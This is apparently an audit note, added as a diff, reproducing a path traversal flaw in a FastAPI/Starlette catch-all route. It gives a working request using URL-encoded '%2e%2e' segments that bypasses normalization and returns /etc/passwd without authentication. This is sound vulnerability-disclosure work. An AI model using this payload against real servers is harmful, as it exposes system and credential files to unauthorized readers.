@@ -1,0 +1,33 @@
+Path Traversal PoC - End-to-End Reproduction
+=============================================
+
+Environment: macOS Darwin 25.3.0
+FastAPI: 0.135.1
+Starlette: 0.50.0
+Python: 3.x
+
+Test Setup:
+- Created temporary FE_OUT_DIR with index.html
+- Registered catch-all route replicating api.py:146-151 logic
+- Used Starlette TestClient
+
+Key Finding:
+- Literal `..` in URL path IS normalized by Starlette (e.g., `/../etc/passwd` -> path=`etc/passwd`)
+- URL-encoded `%2e%2e` bypasses Starlette normalization (e.g., `/%2e%2e/etc/passwd` -> path=`../etc/passwd`)
+- pathlib.Path joins and follows `..` segments, escaping FE_OUT_DIR
+- `Path.is_file()` returns True for traversed paths
+
+Reproduction URL:
+  GET /%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+Result:
+  Status: 200
+  Content: Full contents of /etc/passwd returned
+  Body preview: "## User Database ## Note that this file is consulted directly..."
+
+Attack Vector Clarification:
+  The finding draft's reproduction steps suggest literal `/../..` which would actually be
+  normalized by Starlette. The correct attack uses URL-encoded dots: `%2e%2e` instead of `..`.
+  This is a minor inaccuracy in the draft but does NOT change the validity of the finding.
+
+No authentication required - the catch-all route has no Depends() or middleware protection.
